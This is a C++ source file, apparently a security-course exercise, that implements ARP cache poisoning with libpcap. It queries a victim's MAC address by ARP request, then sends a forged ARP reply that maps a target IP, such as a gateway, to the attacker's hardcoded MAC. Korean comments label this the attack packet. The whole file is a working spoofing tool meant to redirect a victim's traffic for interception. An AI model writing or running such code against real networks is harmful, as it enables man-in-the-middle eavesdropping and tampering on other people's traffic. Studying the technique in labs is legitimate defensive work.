#include "arp_header.h"
#include <stdio.h>
#include <iostream>
#include <arpa/inet.h>  // inet_ntoa
#include <netinet/in.h> // in_addr
#include <pcap.h>


int main(int argc, char* argv[])
{
    uint8_t my_mac[6] = {0x00,0x0c,0x29,0xe5,0xa1,0x2c};
    uint8_t my_ip[4] = {192,168,43,8}; //변경해야함.
    uint8_t broadcast[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
    arp_packet request;
    int senderip;

    /*arp request create*/
    //ether
    request.arp_ether.ether_type = 0x0608; //arp request
    memcpy(request.arp_ether.ether_shost,my_mac,6); //memcpy(멤버변수, 복사값, 사이즈) 주소 저장 배열일 때
    memcpy(request.arp_ether.ether_dhost,broadcast,6);
    //arp
    request.arp.htype = 0x0100;                     //ether
    request.arp.ptype = 0x0008;                     //IP
    request.arp.hlen = 6;                           //Mac address
    request.arp.plen = 4;                           //Protocol address
    request.arp.opcode = 0x0100;                    //arp 요청
    memcpy(request.arp.sender_mac,my_mac, 6);       //send mac
    memcpy(request.arp.sender_ip,my_ip, 4);         //send ip
    memset(request.arp.target_mac, 0x0, 6);         //target mac
    senderip = inet_addr(argv[2]);                     //ip저장
    memcpy(request.arp.target_ip, &senderip, 4);       //target_ip
    /* */


    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(argv[1], BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        //fprintf(stderr, "couldn't open device %s: %s\n", argv[1], errbuf);
        return -1;
    }
    pcap_sendpacket(handle, (const uint8_t*)&request, 42);  //패킷 전송

    arp_packet* reply;
    while (true) {
       struct pcap_pkthdr* header;
       const u_char* packet;
       int res = pcap_next_ex(handle, &header, &packet);
       if (res == 0) continue;
       if (res == -1 || res == -2) break;
       printf("%u bytes captured\n", header->caplen);

       //reply검증
       reply = (arp_packet*)packet;
       if (
       reply->arp_ether.ether_type == 0x0608 &&         //arp 확인
       reply->arp.opcode == 0x0200 &&                   //replay 확인
       *((int*)(reply->arp.sender_ip)) == senderip      //4바이트 끼리 IP 주소값으로 비교
       )
       break; // arp reply get.
     }
    uint8_t sender_mac[6];
    memcpy(sender_mac, reply->arp.sender_mac, 6);       //sender mac 구하기

    arp_packet attack = request; // attack packet       //attack 패킷 생성
    memcpy(attack.arp_ether.ether_dhost, sender_mac, 6);//sender 전송
    memcpy(attack.arp.sender_mac, my_mac, 6);           //target을 내 mac로 위장
    int targetip = inet_addr(argv[3]);                  //target ip변환
    memcpy(attack.arp.sender_ip, &targetip, 4);         //target ip 전송

    pcap_sendpacket(handle, (const uint8_t*)&attack, 42); //패킷 전송


    return 0;
}
